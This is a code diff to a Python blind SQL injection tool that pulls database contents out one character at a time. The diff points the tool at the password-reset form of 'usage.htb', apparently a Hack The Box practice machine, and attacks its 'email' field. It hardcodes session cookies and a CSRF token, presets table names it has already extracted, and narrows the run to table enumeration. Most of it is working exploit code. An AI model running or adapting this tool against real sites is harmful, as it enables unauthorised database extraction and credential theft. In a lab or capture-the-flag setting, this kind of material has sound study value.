@@ -7,6 +7,7 @@ import time
 import os
 import re
 import math
+import copy
 import concurrent.futures
 from abc import ABC, abstractmethod
 from pwn import log
@@ -112,6 +113,17 @@ class StatusEqualCondition(Condition):
 
 
 class RequestType(ABC):
+    _characters = (
+        list(range(97, 123))
+        + [95, 44, 64, 45]
+        + list(range(48, 58))
+        + list(range(33, 44))
+        + [46, 47]
+        + list(range(58, 64))
+        + list(range(65, 95))
+        + [96]
+        + list(range(123, 127))
+    )
 
     @abstractmethod
     def build_request(
@@ -159,13 +171,15 @@ class PostRequest(RequestType):
     ) -> list:
 
         result = []
-        characters = list(range(33, 127))
 
-        for character in characters:
+        for character in self._characters:
             concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
-            data[atribute_to_exploit] = concat_payload
+            copy_data = data.copy()
+            copy_data[atribute_to_exploit] = concat_payload
             result.append(
-                structs.WrapperRequest(data, character, main_url, headers, condition)
+                structs.WrapperRequest(
+                    copy_data, character, main_url, headers, condition
+                )
             )
 
         return result
@@ -213,9 +227,8 @@ class GetRequest(RequestType):
     ) -> list:
 
         result = []
-        characters = list(range(33, 127))
 
-        for character in characters:
+        for character in self._characters:
             result.append(
                 structs.WrapperRequest(
                     f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
@@ -482,8 +495,8 @@ class Extractor:
         global stop_threads
 
         stop_threads = True
-        info = ""
-        position = 1
+        info = "admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_"
+        position = 60
 
         while stop_threads:
             stop_threads = False
@@ -644,14 +657,19 @@ def main():
     label_threads = log.progress(f"{utils.Color.BOLD}Threads{utils.Color.END}")
 
     # Initiate parameters specifying them
-    main_url = "http://192.168.1.103/imfadministrator/cms.php?pagename="
-    headers = {"Cookie": "PHPSESSID=nl4laaouglaed8vvlqmpua5k26"}
-    data = "home"
-    method = GetRequest()
-    condition = TextInCondition("Welcome to the IMF Administration")
+    main_url = "http://usage.htb/forget-password"
+    headers = {
+        "Cookie": "eyJpdiI6Ii8yQXF5SWtjSHhVdDBWVXFhSXBhbkE9PSIsInZhbHVlIjoiQlg5N045ZzFaNjZsbzhsdy9USlRmdVRzeXQ5WDErN3VONXBkYVpiLzFrSll1RVhXcmpkWVFvMmhBTlN2VzFMSnNrOU1XSkE3MzdteDdIdXV5Q2VXbjJMT3R4TXJ2SGd3OXlEb3E3VnFhRy9FUzJzeTlweWhLZXdITkQwZ3BySVciLCJtYWMiOiJlYWQ5ZGRhYWNkNWYxOGJjNjdiNDE0Y2RmNTBmY2QzZDgyYmFhM2NmNzE0MTcyN2VkZTZlYjMzNDFmMTVhYWQ4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlBzSHdwQnhIZlIvR2lLZ21nbXM5R0E9PSIsInZhbHVlIjoicXZkY3lGN2lHaW1ZY2JaTU9KTVRpTnU1SGh6NUdua3FJb3FZa1A3MmI2Q0F3MWRNOFJJYTM4ZVJ0dEdSVXlCNGZSUzFRbGJ3cGswelBUb2lZV05IT2xEa3d6enFCOWxIVC9peFhTbEYzMkpJQVdjTTVLNUFsSllFcEdrT09ucHgiLCJtYWMiOiI4NGQ4MTNjNjc2ODQ3ZjMzMTUyYWJmNGUyMDJkMzc1NmU4NTMxNTA3NTEyYjdiNDYyNzYyNzQ0ZjFlNGJiNjg0IiwidGFnIjoiIn0%3D"
+    }
+    data = {
+        "_token": "iCzjG2KwyBsD76adgj4eSaipnT4qyMod5KikpF49",
+        "email": "test@gmail.com",
+    }
+    method = PostRequest()
+    condition = TextInCondition("We have e-mailed your password reset link to ")
     payload = ConditionalPayload()
-    num_threads = 3
-    atribute_to_exploit = ""
+    num_threads = 1
+    atribute_to_exploit = "email"
 
     label_url.status(main_url)
     label_method.status(method.__str__())
@@ -681,12 +699,14 @@ def main():
     print("\n")
     time.sleep(1)
 
-    instance.get_user(label_menu)
-    instance.get_dbs(label_menu)
+    instance._dbs.append(structs.DB("usage_blog", []))
+
+    # instance.get_user(label_menu)
+    # instance.get_dbs(label_menu)
     instance.get_tables(label_menu)
-    instance.get_columns(label_menu)
-    instance.get_rows(label_menu)
-    instance.build_file()
+    # instance.get_columns(label_menu)
+    # instance.get_rows(label_menu)
+    # instance.build_file()
 
 
 if __name__ == "__main__":
